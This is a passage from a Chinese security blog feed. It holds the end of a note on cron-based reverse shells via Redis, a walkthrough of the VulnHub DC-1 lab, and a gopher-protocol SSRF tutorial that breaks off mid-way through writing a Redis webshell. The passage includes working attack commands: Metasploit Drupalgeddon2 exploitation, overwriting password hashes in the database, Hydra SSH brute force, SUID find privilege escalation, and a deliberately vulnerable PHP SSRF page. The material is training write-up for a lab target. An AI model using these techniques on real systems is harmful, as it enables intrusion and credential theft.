shell</code>，不具备交互功能，只具备脚本运行的功能</p></li><li><p>centos与ubuntu的计划任务有哪些不同？</p><ul><li><p>ubuntu的用户计划任务目录在<code>/var/spool/cron/crontabs/</code>，centos在<code>/var/spool/cron/</code></p></li><li><p>ubuntu用户计划任务文件必须是600权限</p></li></ul></li><li><p>&#x2F;etc&#x2F;cron与&#x2F;var&#x2F;spool&#x2F;cron有啥区别？</p><ul><li>是系统级别的计划任务文件；&#x2F;var&#x2F;spool&#x2F;cron是用户级别的</li></ul><ul><li>echo写入命令到&#x2F;etc&#x2F;cron时，不影响其权限，适用于docker特权逃逸</li></ul></li><li><p>ubuntu直接编辑<code>/var/spool/cron/crontabs/root</code>文件设置<code>root</code>的计划任务是无法成功的，因为文件的权限不是0600。设置的时候尽量使用<code>crontab -e</code>命令，或者写入<code>/etc/crontab</code>里面；如果在渗透时用不了<code>crontab -e</code>命令，可使用法四。<strong>至于centos的话，任何方法均可，不受影响。</strong></p></li></ol><h2 id="Ubuntu中redis计划任务"><a href="#Ubuntu中redis计划任务" class="headerlink" title="Ubuntu中redis计划任务"></a>Ubuntu中redis计划任务</h2><p>最后回到一开始的问题，Ubuntu中redis计划任务不能成功的原因有：</p><ol><li>Ubuntu默认shell环境不是bash而是dash</li><li>Ubuntu计划任务的路径与centOS不同</li><li>root文件权限不为600</li><li>redis写入文件有时有乱码</li></ol><p>其中前三个问题都可以解决，最后一个问题我在Ubuntu上手动删除了乱码后成功，但是真实情况应该不怎么用的上</p><p>将dash改为bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s -f /bin/bash /bin/sh</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230630161936876.png"></p><p><img src="http://pic.bamboo22.top/image-20230630161750252.png"></p><p>参考大佬的文章：<a href="https://mp.weixin.qq.com/s?__biz=MzIyMzcwMTg1MA==&mid=2247486475&idx=1&sn=1518e6bc38cd2a10d78d5711fdb8fd57&chksm=e81b723edf6cfb287f556e2bc7e5dcfb6ed31810abd3e272ed05606bacacfea6b428dad6fa85&mpshare=1&scene=23&srcid=0624ojOQzDE3mIEWT6uPyMMm&sharer_sharetime=1687605892910&sharer_shareid=887ca9bd754f6319a7972e14913173ae#rd">底层原理 | Linux计划任务反弹shell探究 </a></p>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DC1 &amp; DC靶场搭建</title>
      <link href="/2024/01/22/DC%E9%9D%B6%E5%9C%BA/"/>
      <url>/2024/01/22/DC%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="DC靶场"><a href="#DC靶场" class="headerlink" title="DC靶场"></a>DC靶场</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官网下载链接<a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></p><p>下载后用vmware打开这个.ova文件</p><p><img src="http://pic.bamboo22.top/image-20230711203603065.png"></p><p>按照提示安装，成功以后就是这个登录界面</p><p><img src="http://pic.bamboo22.top/image-20230711203811141.png"></p><p>渗透的目标就是拿到密码登录</p><p>注意这里我是用到NAT模式，保证靶机和攻击机在同一网段</p><h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><p>来到第一关，我们用kali做攻击机，DC-1为靶机</p><p> <img src="http://pic.bamboo22.top/image-20230711204226711.png"></p><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><h4 id="1-探测目标IP地址"><a href="#1-探测目标IP地址" class="headerlink" title="1.探测目标IP地址"></a>1.探测目标IP地址</h4><p>探测当前网段下的IP</p><p>探测主机的工具有很多，常见的有arp-scan、nmap还有netdiscover</p><ul><li>arp-scan</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711210016700.png"></p><p>可以看到同一网段上的所有IP</p><p><img src="http://pic.bamboo22.top/image-20230711205948433.png"></p><p>查看靶机的MAC地址，现在可以确定靶机的ip为<strong>192.168.85.130</strong></p><ul><li>也可以用<strong>nmap</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.85</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">    </span><br><span class="line">ip后面改为了<span class="number">0</span>/<span class="number">24</span>, 在这里“<span class="number">192.168</span><span class="number">.85</span><span class="number">.0</span>/<span class="number">24</span>”表示的是这个网段的IP地址从从<span class="number">192.168</span><span class="number">.85</span><span class="number">.1</span>开始，到<span class="number">192.168</span><span class="number">.85</span><span class="number">.254</span>结束（<span class="number">192.168</span><span class="number">.85</span><span class="number">.0</span>和<span class="number">192.168</span><span class="number">.85</span><span class="number">.255</span>有特殊含义不能当做ip地址）；子网掩码是<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711210451146.png"></p><p>同样也能扫出IP</p><ul><li>还有<strong>netdiscover</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711210759153.png"></p><h4 id="2-探测目标IP开放端口"><a href="#2-探测目标IP开放端口" class="headerlink" title="2.探测目标IP开放端口"></a>2.探测目标IP开放端口</h4><p>用nmap探测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- <span class="number">192.168</span><span class="number">.85</span><span class="number">.130</span></span><br><span class="line"></span><br><span class="line">-sV  扫描目标主机端口上运行的软件信息</span><br><span class="line">-p-  扫描全部端口<span class="number">0</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711211401150.png"><br>可以看到开放的端口有：<strong>22、80、111、48080</strong></p><p>20和80端口是我们的突破口，80是http协议，我们用浏览器访问一下看看</p><h4 id="3-网页信息收集"><a href="#3-网页信息收集" class="headerlink" title="3.网页信息收集"></a>3.网页信息收集</h4><p>访问<strong>192.168.85.130</strong></p><p><img src="http://pic.bamboo22.top/image-20230711212034890.png"></p><p>可以用Firefox的插件看到站点信息是 <strong>Drupal</strong></p><p>也可以用kali自带的工具<strong>whatweb</strong>扫</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v <span class="number">192.168</span><span class="number">.85</span><span class="number">.130</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711212623130.png"></p><p>接下来用dirsearch扫网站目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.85.130 -e *</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711214112802.png"><br>东西挺多的，先放着</p><p>得到如下信息：</p><ul><li>CMS是Drupal</li><li>Apache 2.2.22</li><li>PHP 5.4.45</li><li>jQuery 1.4.4</li></ul><hr><h3 id="二、漏洞查找与利用"><a href="#二、漏洞查找与利用" class="headerlink" title="二、漏洞查找与利用"></a>二、漏洞查找与利用</h3><p>知道cms，我们一般从cms出发找漏洞，百度一下drupal漏洞 </p><p><img src="http://pic.bamboo22.top/image-20230711215805702.png"></p><p>有框架漏洞</p><h4 id="1-漏洞查找"><a href="#1-漏洞查找" class="headerlink" title="1.漏洞查找"></a>1.漏洞查找</h4><p>用工具Metasploit（目前世界上领先的渗透测试工具，也是信息安全与渗透测试领域最大的开源项目之一），先找下漏洞，先打开工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole    启动</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711220101903.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search Drupal       搜索Drupal漏洞</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711220721820.png"><br>可以看到这个cms框架还是有挺多漏洞的，这里我们利用漏洞等级较高的，且时间最新的18年那个漏洞</p><h4 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h4><p>利用18年那个洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711221221882.png"></p><p>接着看一下该漏洞模块参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711221437925.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Current Setting是目前设置的内容</span><br><span class="line">Required表示是否需要设置内容，yes为必须设置，no可以设置也可不设置</span><br><span class="line">就上面来说RHOSTS需要set，但是没有内容</span><br></pre></td></tr></table></figure><p>所以接着我们来设置一下RHOSTS内容（就是攻击目标IP地址，靶场地址）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS <span class="number">192.168</span><span class="number">.85</span><span class="number">.130</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711221743947.png"></p><p>设置完后就可以看到RHOSTS有ip了</p><p>设置完后开始攻击</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit  或者run</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711222048595.png"></p><p>出现Meterpreter session 1 opened（kali和目标ip的连接）就说明攻击成功啦，接下来我们可以getshell了</p><h3 id="三、getshell"><a href="#三、getshell" class="headerlink" title="三、getshell"></a>三、getshell</h3><h4 id="普通shell"><a href="#普通shell" class="headerlink" title="普通shell"></a>普通shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p>可以执行命令</p><p><img src="http://pic.bamboo22.top/image-20230712114021928.png"></p><h4 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h4><p>用python脚本获取交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>但是这个要靶机上有python才行</p><p><img src="http://pic.bamboo22.top/image-20230712130841566.png"></p><p>看到一个flag1.txt，查看一下</p><p><img src="http://pic.bamboo22.top/image-20230712114555874.png"></p><p>看到Every good CMS needs a config file - and so do you.这个提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*      查看还有哪些叫flag的文件</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712114856925.png"></p><p>没有了</p><p>刚刚提示说的配置文件，搜索drupal配置文件存放路径为 sites&#x2F;default&#x2F;settings.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sites/default/settings.php</span><br></pre></td></tr></table></figure><p>也可以知道是setting.php,用命令直接搜索并打开，内联执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat `find / -name settings.php`</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712115410723.png"></p><p>看到flag2中有提示，提到证书有什么用先放一放吧</p><p><img src="http://pic.bamboo22.top/image-20230712115936119.png"></p><p>还看到了一个数据库，有账号和密码，那么就可以尝试登录进去看看</p><h3 id="四、数据库渗透"><a href="#四、数据库渗透" class="headerlink" title="四、数据库渗透"></a>四、数据库渗透</h3><p>我们用刚刚拿到的数据库账号密码登录，注意这里必须是交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712131033943.png"></p><p>进入drupaldb这个数据库，看看里面的数据</p><p><img src="http://pic.bamboo22.top/image-20230712133008708.png"></p><p>发现有两个user的表</p><p><img src="http://pic.bamboo22.top/image-20230712133119123.png"></p><p>查一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712133334634.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |</span><br><span class="line"></span><br><span class="line">| Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |</span><br></pre></td></tr></table></figure><p>密码比较复杂，应该不是明文，那想登进后台就很难了，我们可以通过修改admin的密码，或者是新加一个admin</p><p><a href="https://drupalchina.cn/node/2128">分享：忘记Drupal的管理员密码的解决办法 | Drupal China</a></p><p><strong>法一：修改admin密码</strong></p><p>我们得先找到加密文件，Drupal的加密脚本在<code>/var/www/scripts/password-hash.sh</code></p><p>目录下，我们先用exit退出mysql</p><p><img src="http://pic.bamboo22.top/image-20230712134316624.png"></p><p>这个脚本是用php写的，而且还能用php加参数运行，直接得到加密后的密码，这里我们设置一个密码123456 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php /var/www/scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712134414016.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password:123456</span><br><span class="line">hash: $S$D57b7lreyHHd9YxLVFT.mAZvE1O.QSaAIdQ98Hl0gccSpRpx0Br/</span><br></pre></td></tr></table></figure><p>得到加密后的密码， 接着我们登入mysql修改一下admin跟Fred的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br><span class="line">use drupaldb;update users set pass = &quot;$S$D1UQvb3x7lKoCSX6S9K.r.wB202Lsa/r7fkOj7CelJsSEMFDJjGv&quot; where name = &#x27;admin&#x27; or name = &#x27;Fred&#x27;;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712134857654.png"></p><p>修改成功</p><p><strong>法二：添加admin权限用户</strong> </p><p>drupal7版本在有个SQL注入的漏洞，可以添加一个admin权限的用户，适用版本7.31以下，我们可以在msf找一下这个工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit drupal               </span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712135304493.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 34992.py -p</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712135403150.png"></p><p>可以去这个链接里面找脚本</p><p>接下来我们就用修改好的密码登录，在右上角的content中找到flag3</p><p><img src="http://pic.bamboo22.top/image-20230712135735109.png"></p><p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p><p>提示了我们一些信息passwd和shadow，明显就是linux的文件</p><blockquote><p>&#x2F;etc&#x2F;passwd</p><p>该文件存储了系统用户的基本信息，所有用户都可以对其进行文件操作读</p><p><a href="http://c.biancheng.net/view/839.html">Linux &#x2F;etc&#x2F;passwd内容解释（超详细） (biancheng.net)</a></p><p>&#x2F;etc&#x2F;shadow</p><p>该文件存储了系统用户的密码等信息，只有root权限用户才能读取</p><p><a href="http://c.biancheng.net/view/840.html">Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细） (biancheng.net)</a></p></blockquote><p><img src="http://pic.bamboo22.top/image-20230712140610272.png"></p><p>看到flag4，我们有两个方法拿到这个用户的密码，一个是爆破，另一个就是提权打开shadow文件查看密码</p><h3 id="五、用户密码爆破"><a href="#五、用户密码爆破" class="headerlink" title="五、用户密码爆破"></a>五、用户密码爆破</h3><p>事先参考SSH</p><p><a href="https://blog.csdn.net/li528405176/article/details/82810342?ops_request_misc=%7B%22request_id%22:%22165642658616782388078059%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165642658616782388078059&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-82810342-null-null.142%5Ev24%5Econtrol,157%5Ev15%5Enew_3&utm_term=SSH&spm=1018.2226.3001.4187">SSH简介及两种远程登录的方法_ssh -CSDN博客</a></p><p>利用工具Hydra爆破flag4的密码</p><p><a href="http://www.ha97.com/5186.html">（总结）Linux下的暴力密码在线破解工具Hydra详解 (ha97.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.85.130</span><br></pre></td></tr></table></figure><p>用hydra爆破</p><p><img src="http://pic.bamboo22.top/image-20230712141634364.png"></p><p>爆破出密码为orange，然后我们用kali连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh flag4@192.168.85.130</span><br></pre></td></tr></table></figure><p>输入orange登录成功</p><p><img src="http://pic.bamboo22.top/image-20230712142806332.png"><br><img src="http://pic.bamboo22.top/image-20230712142935462.png"></p><p>拿到flag4</p><h3 id="六、-Linux提权"><a href="#六、-Linux提权" class="headerlink" title="六、 Linux提权"></a>六、 Linux提权</h3><p>需要用到SUID提权，参考<a href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权 - FreeBuf网络安全行业门户</a></p><p>利用find命令，找查具有SUID权限的可执行二进制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712143506711.png"></p><p>find比较常用，可以执行root权限的命令找查文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -name index.php -exec &quot;/bin/sh&quot; \;</span><br><span class="line"></span><br><span class="line">这里找查什么文件不重要（但是是存在的文件），只需要格式对，然后后面加上-exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712143644895.png"></p><p>成功提权，最后来找第五个flag</p><p><img src="http://pic.bamboo22.top/image-20230712143832624.png"></p><p>成功通关！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透打靶 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gopher协议</title>
      <link href="/2024/01/22/gopher%E5%8D%8F%E8%AE%AE/"/>
      <url>/2024/01/22/gopher%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h1><h2 id="什么是gopher协议"><a href="#什么是gopher协议" class="headerlink" title="什么是gopher协议"></a>什么是gopher协议</h2><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p><blockquote><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p></blockquote><p>但是gopher协议在各个语言中是有使用限制的。</p><table><thead><tr><th align="center">语言</th><th align="center">支持情况</th></tr></thead><tbody><tr><td align="center">PHP</td><td align="center">–wite-curlwrappers且php版本至少为5.3</td></tr><tr><td align="center">Java</td><td align="center">小于JDK1.7</td></tr><tr><td align="center">Curl</td><td align="center">低版本不支持</td></tr><tr><td align="center">Perl</td><td align="center">支持</td></tr><tr><td align="center">ASP.NET</td><td align="center">小于版本3</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--wite-curlwrappers：运用curl工具打开url流</span><br><span class="line">curl使用curl --version查看版本以及支持的协议</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230709103328078.png"></p><p>上面说的curl低版本不支持gopher协议，但是我的Windows上的curl8.0.1也不支持</p><h2 id="gopher协议格式"><a href="#gopher协议格式" class="headerlink" title="gopher协议格式"></a>gopher协议格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><ul><li>gopher的默认端口是70</li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li></ul><h3 id="Gopher发送请求HTTP-GET请求："><a href="#Gopher发送请求HTTP-GET请求：" class="headerlink" title="Gopher发送请求HTTP GET请求："></a>Gopher发送请求HTTP GET请求：</h3><p>使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求</p><p>这里我在Ubuntu上curl发送gopher请求，Windows上监听</p><p><img src="http://pic.bamboo22.top/image-20230709114819492.png"></p><p><img src="http://pic.bamboo22.top/image-20230709114836425.png"></p><p>可以看到nc收到gopher发出的请求，但是第一个字符被吃了，所以我们使用gopher协议发送请求的时候要在url前面加入任意一个字符</p><p><strong>在gopher协议中发送http的数据</strong></p><ol><li>构造HTTP数据包</li><li>URL编码、替换回车换行为%0d%0a</li><li>发送gopher协议</li></ol><p>下面就来本地测试一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>找一个get请求数据包，抓包获取http请求内容</p><p><img src="http://pic.bamboo22.top/image-20230709115933147.png"></p><p>我们需要的只有Host之前的内容</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/test.php?name=abc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure><p>将请求内容url编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.130.1:2222/GET%20%2Ftest.php%3Fname%3Dabc%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%0D%0A</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ol><li>问号（?）需要转码为URL编码，也就是%3f</li><li>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</li><li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li></ol><p><img src="http://pic.bamboo22.top/image-20230709120806524.png"></p><p><img src="http://pic.bamboo22.top/image-20230709120819415.png"></p><h3 id="Gopher发送请求HTTP-POST请求："><a href="#Gopher发送请求HTTP-POST请求：" class="headerlink" title="Gopher发送请求HTTP POST请求："></a>Gopher发送请求HTTP POST请求：</h3><p>同样本地测试</p><p>先用htttp发一个post请求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230709121501648.png"></p><p>用gopher协议发post请求必须的参数是</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test.php?name=abc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"></span></span><br><span class="line"><span class="language-abnf"><span class="attribute">name</span><span class="operator">=</span>abc</span></span><br><span class="line"><span class="language-abnf"></span></span><br></pre></td></tr></table></figure><p>URL编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.130.1:2222/_POST%20%2Ftest.php%3Fname%3Dabc%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Aname%3Dabc%0D%0A</span><br></pre></td></tr></table></figure><p><strong>同样也需要将回车换行改为%0D%0A</strong></p><p><img src="http://pic.bamboo22.top/image-20230709122527643.png"></p><p><img src="http://pic.bamboo22.top/image-20230709122512471.png"></p><h2 id="利用gopher打redis"><a href="#利用gopher打redis" class="headerlink" title="利用gopher打redis"></a>利用gopher打redis</h2><p>先写一个含有ssrf的网页</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;there&#x27;s a ssrf in url，try it!&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230709172217577.png"></p><p>尝试输入百度，页面跳转</p><p><img src="http://pic.bamboo22.top/image-20230709172324389.png"></p><p>127.0.0.1，没有过滤</p><p><img src="http://pic.bamboo22.top/image-20230709172241142.png"></p><p>用dict可以直接探测靶机上的服务信息</p><p><img src="http://pic.bamboo22.top/image-20230709172548226.png"></p><p>攻击原理很简单，就是利用gopher协议模拟redis通信</p><p>接下来我们就来利用ssrf打reds，我们知道redis有好几种利用方式，这里我们就用写webshell来演示，其他的利用方式都是一样的原理</p><p>正常情况是连接攻击机的redis后执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\n\n\n&lt;?php 